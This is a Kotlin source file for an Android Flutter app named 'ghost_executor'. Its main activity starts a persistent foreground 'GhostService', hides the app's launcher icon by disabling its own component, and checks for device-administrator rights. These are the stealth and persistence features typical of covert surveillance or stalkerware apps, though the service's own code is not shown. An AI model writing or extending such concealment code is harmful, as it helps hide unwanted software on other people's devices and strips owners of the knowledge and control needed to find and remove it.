package com.example.ghost_executor

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.content.Intent
import android.content.pm.PackageManager
import android.content.ComponentName
import android.app.admin.DevicePolicyManager

class MainActivity: FlutterActivity() {
    private val CHANNEL = "com.ghost.executor"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "startService" -> {
                    val serviceIntent = Intent(this, GhostService::class.java)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(serviceIntent) else startService(serviceIntent)
                    result.success(true)
                }
                "hideIcon" -> {
                    val pm = packageManager
                    val componentName = ComponentName(this, MainActivity::class.java)
                    pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    result.success(true)
                }
                "isDeviceAdmin" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
                    result.success(dpm.isAdminActive(admin))
                }
                else -> result.notImplemented()
            }
        }
    }
}